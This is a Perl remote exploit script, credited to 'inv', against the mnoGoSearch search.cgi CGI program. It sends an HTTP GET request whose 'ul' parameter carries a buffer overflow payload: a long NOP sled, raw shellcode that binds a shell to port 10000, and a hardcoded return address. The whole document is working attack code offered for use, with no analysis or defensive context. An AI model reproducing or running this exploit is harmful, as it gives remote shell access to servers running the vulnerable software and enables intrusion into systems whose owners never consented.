# shellcode binds shell to port 10000

use IO::Socket;

unless (@ARGV > 0) { die "Usage ./DSR-mnogo IP"}

$host = shift(@ARGV);
$ret = pack("l",0xbfbff670);
$nop = "\x90"x5402;

$shellcode = 
"\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x52\x66\x68\x27\x10\x66\x51\x89\xe6\xb1\x10\x51\x56\x50\x50\xb0\x68\xcd\x80\x51\x53\x53\xb0\x6a\xcd\x80\x52\x52\x53\x53\xb0\x1e\xcd\x80\xb1\x03\x89\xc3\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80";


$exploit_string = $nop.$shellcode.$ret.$ret;


print "\nRemote Mnogo Exploit \n";
print "Code by inv \n\n";
print "Host: $host\n";

$remote = IO::Socket::INET->new(

	Proto	 	=>	"tcp",
	PeerAddr	=>	$host,
	PeerPort	=>	"http(80)",
	);

$remote->autoflush(1);

print $remote "GET /cgi-bin/search.cgi?ul=$exploit_string HTTP/1.0\n\n";

while ( <$remote> ) { print }

close $remote;


